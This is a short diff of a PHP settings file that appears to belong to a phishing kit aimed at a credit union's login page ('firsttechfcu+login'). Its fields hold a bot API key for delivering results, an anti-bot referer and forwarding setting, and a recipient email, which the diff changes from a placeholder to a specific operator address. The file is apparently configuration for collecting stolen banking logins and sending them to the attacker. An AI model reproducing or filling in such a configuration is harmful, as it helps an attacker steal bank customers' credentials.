@@ -17,7 +17,7 @@ $settings = array(
 	"bot_url"		=> "bot",	// Your Bot API Key (ADD "bot" BEFORE API KEY)
 	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
 	"out"			=> "firsttechfcu+login",	// Outcome Of AntiBots Forward - DONT CHANGE
-	"email"			=> "your@gmail.com",	// Your E-Mail
+	"email"			=> "tyger120@tygerre.online",	// Your E-Mail
 );
 return $settings;
 
